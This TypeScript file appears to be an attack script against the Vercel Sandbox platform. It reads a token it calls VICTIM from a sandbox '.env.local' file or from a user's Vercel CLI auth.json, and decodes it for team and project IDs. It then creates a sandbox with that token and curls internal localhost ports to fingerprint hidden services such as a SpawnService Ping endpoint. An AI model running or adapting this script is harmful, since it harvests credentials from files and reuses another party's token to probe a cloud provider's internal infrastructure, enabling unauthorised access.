import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "ports-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const dom = sbx.domain(3000);
  const SCRIPT = `
set +e
echo "===== localhost:30001-30003 fingerprint (identidad) ====="
for p in 30001 30002 30003 23456; do
  echo "--- port $p ---"
  echo -n "GET / -> "; timeout 3 curl -s -D - -o /dev/null -H 'Host: x' http://127.0.0.1:$p/ 2>&1 | head -4 | tr '\\n' ' '; echo ""
  echo -n "GET /vercel.sandbox.spawn.v1.SpawnService/Ping -> "; timeout 3 curl -s -D - -H 'Host: x' http://127.0.0.1:$p/vercel.sandbox.spawn.v1.SpawnService/Ping 2>&1 | head -6 | tr '\\n' ' '; echo ""
  echo -n "GET /healthz -> "; timeout 3 curl -s http://127.0.0.1:$p/healthz 2>&1 | head -2 | tr '\\n' ' '; echo ""
done
echo "===== DONE ====="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log("DOMAIN=" + dom);
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });